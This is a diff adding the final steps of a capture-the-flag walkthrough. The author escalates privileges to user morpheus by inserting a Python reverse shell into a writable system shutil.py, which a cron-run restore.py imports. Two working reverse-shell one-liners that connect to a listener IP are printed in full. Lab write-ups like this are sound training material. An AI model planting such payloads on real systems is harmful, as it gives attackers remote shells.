@@ -1332,3 +1332,36 @@ Notice the file shutil.py.
 Which was also inside the file /home/morpheus/restore.py
 
 Meaning if the file shutil.py is writable by user death meaning we could intentionally control the file restore.py.
+
+Now its time to control the file shutil.py at the location 
+
+/usr/lib/python3.8/shutil.py
+
+we're going to insert this payload into the file shutil.py
+
+```python3
+import os,pty,socket;s=socket.socket();s.connect(("192.168.246.164",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
+```
+
+But with this payload we didn't get shell instead we tried anothoer paylaoad
+
+```payload2
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.246.164",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+```
+
+And this time we got the shell but the method to get the shell was not correct.
+
+What we did was we edit the file shutil.py and executed it and in this way the shell we get was as the user.
+
+
+All we did this due to hurry in getting the morpheus flag cuz it was the last flag.
+
+we need to wait because there is a cronjob that we can see by crontab -e.
+
+which let us gave the shell as morpheus.
+
+![crontab](https://miro.medium.com/v2/resize:fit:640/format:webp/1*nk3QqXJ0Xsx32EDhXt0NBQ.png)
+
+Now when we updated it and wait to our listener we got the shell as user morpheus.
+
+After getting the shell we read the flag and in this way the last flag we got and the room gets solved.
